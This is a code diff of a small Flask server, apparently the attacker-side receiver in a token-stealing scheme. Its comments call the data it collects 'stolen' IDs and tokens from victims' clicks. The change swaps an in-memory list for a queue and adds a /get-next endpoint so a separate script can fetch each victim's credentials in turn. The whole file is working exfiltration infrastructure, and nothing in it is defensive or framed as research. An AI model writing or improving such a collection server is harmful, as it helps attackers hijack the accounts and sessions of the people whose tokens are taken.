@@ -1,22 +1,18 @@
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-
-# This is a "temporary database" in the server's memory
-database = []
+# This list stores the tokens like a queue
+stolen_queue = []
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    data = request.get_json()
-    # Add the stolen ID and Token to our list
-    database.append(data)
-    print(f"[*] New Victim Captured: {data}")
-    return jsonify({"status": "success"}), 200
+    data = request.get_json() # Stolen data from the click
+    stolen_queue.append(data)
+    return jsonify({"status": "received"}), 200
 
-@app.route('/get-tokens', methods=['GET'])
-def get_tokens():
-    # This allows your Python script to "download" the list
-    return jsonify(database)
-
-if __name__ == "__main__":
-    app.run()
+@app.route('/get-next', methods=['GET'])
+def get_next():
+    # This lets the Python script grab the next victim
+    if stolen_queue:
+        return jsonify(stolen_queue.pop(0)) # Gives the data and removes it from list
+    return jsonify({"status": "empty"}), 404
